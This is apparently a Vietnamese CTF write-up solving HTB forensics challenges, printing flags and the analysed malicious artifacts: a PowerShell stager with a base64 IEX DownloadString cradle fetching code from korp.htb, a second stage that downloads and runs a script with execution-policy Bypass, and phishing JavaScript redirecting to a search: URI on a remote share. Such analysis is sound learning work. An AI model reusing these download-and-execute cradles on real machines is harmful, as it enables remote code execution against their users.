![image](https://github.com/user-attachments/assets/94a89594-6f36-4233-9bcf-da33d5406dc2)

# _Thorin’s Amulet_ _(FORSENSICS)_

![image](https://github.com/user-attachments/assets/1f8fd6b4-c229-4ca2-aa4e-ce5120d5db9e)

Nhận được file ps1

```powershell
function qt4PO {
    if ($env:COMPUTERNAME -ne "WORKSTATION-DM-0043") {
        exit
    }
    powershell.exe -NoProfile -NonInteractive -EncodedCommand "SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCJodHRwOi8va29ycC5odGIvdXBkYXRlIik="
}
qt4PO
```

Decode base64 nhận được 1 đường link, thử truy dùng port để truy cập nhưng kh đc

```powershell
IEX (New-Object Net.WebClient).DownloadString("http://korp.htb/update")
```

Đọc kĩ lại mô tả thì thấy có NOTE

> Note: make sure that domain korp.htb resolves to your docker instance IP and also consider the assigned port to interact with the service.

Mình dùng kali để add IP và domain vào /etc/host/

![image](https://github.com/user-attachments/assets/639b3022-3acc-40ac-be10-345154933c52)

Truy cập thử, thì nhận được file ps1 tiếp

```powershell
function aqFVaq {
    Invoke-WebRequest -Uri "http://korp.htb/a541a" -Headers @{"X-ST4G3R-KEY"="5337d322906ff18afedc1edc191d325d"} -Method GET -OutFile a541a.ps1
    powershell.exe -exec Bypass -File "a541a.ps1"
}
aqFVaq
```

Lệnh trên thực hiện tải file ps1 và chạy với lệnh Bypass, muốn xem file có gì thì mình dùng curl kết hợp với KEY xác thực

![image](https://github.com/user-attachments/assets/f404de2a-bac1-4d15-a224-45825120d93a)

Decode là nhận được flag

```
HTB{7h0R1N_H45_4lW4Y5_833n_4N_9r347_1NV3n70r}
```

# _A new hire_ _(FORSENSICS)_

![image](https://github.com/user-attachments/assets/e9725ec1-0825-45f3-b533-a3cb000b9160)

Tiếp tục là file email.eml, mở ra xem 

![image](https://github.com/user-attachments/assets/291d60c8-f0a1-41fa-860e-fcc4ffbf43ca)

Hmm khá giống với thử thách trước, add IP và domain vô /etc/hosts/

Truy cập http://storage.microsoftcloudservices.com:[PORT]//index.php

![image](https://github.com/user-attachments/assets/05a439ab-318b-4540-b8f9-47677819ce09)

Xem source, chú ý đến đoạn sau

```html
  <div class="blur-overlay">
    <button class="view-button" onclick="getResume()">View Full Resume</button>
  </div>
  <script defer="defer">
    setTimeout(() => {
      document.getElementById('loading').style.display = 'none';
      document.getElementById('main-content').style.display = 'flex';
    }, 5000);

    function getResume() {
      window.location.href=`search:displayname=Downloads&subquery=\\\\${window.location.hostname}@${window.location.port}\\3fe1690d955e8fd2a0b282501570e1f4\\resumes\\`;
    }
  </script>
```

Trang web bị blur, mình thử bỏ nó đi thì nhận được nội dung giống như 1 CV, kh có gì đáng chú ý

![image](https://github.com/user-attachments/assets/7d5f0228-6d81-4d0b-82ee-fb8e990d5665)

Nhìn xuống tiếp hàm getResume(), thấy được sử dụng JavaScript để điều khiển hiển thị nội dung và chuyển hướng người dùng đến một tệp \\3fe1690d955e8fd2a0b282501570e1f4\\resumes\\, nhưng mình nhấn View Full Resume khi trang web đang bị blur thì kh thấy gì

Từ đây mình nghĩ có thể lấy đường link _http://storage.microsoftcloudservices.com:[PORT]//index.php_  thay index.php thành \\3fe1690d955e8fd2a0b282501570e1f4\\resumes\\ và truy cập trực tiếp luôn

![image](https://github.com/user-attachments/assets/7c4e4922-6dc1-4d35-8971-8e2b92d44b08)

Tải file Resume.pdf.link về 

![image](https://github.com/user-attachments/assets/d37b2856-beab-4091-9bc9-cad6a70802aa)

Decode base64

![image](https://github.com/user-attachments/assets/f5b5a99a-28aa-44ff-b378-518aa73ef0ff)

Có 1 đoạn pws được dùng để mở và truy cập các đường link, truy cập vô client.py

![image](https://github.com/user-attachments/assets/1944f076-b948-47c5-afb7-fc71aef2bb7e)

Thấy có 1 key và 1 data khá dài, bên dưới dùng lệnh xor key với data và chạy lệnh exec để thực thi, mình thử thay thành print để in luôn kết quả nhưng vẫn bị mã hóa, loay hoay mãi thì thử base64 decrypt key thì có được flag :v Lừa vl

```
HTB{4PT_28_4nd_m1cr0s0ft_s34rch=1n1t14l_4cc3s!!}
```

# _Cave Expedition_ _(FORSENSICS)_

![image](https://github.com/user-attachments/assets/7483bc04-6ee6-4cd3-be34-48f176dce7bf)

Bài cho tất cả các tệp log được sắp xếp theo bảng chữ cái hmm, ngồi đọc chay hết chắc cũng ốm mất

Dùng tool Evtxcmd để trích xuất hết ra csv rồi ngồi lọc thôi








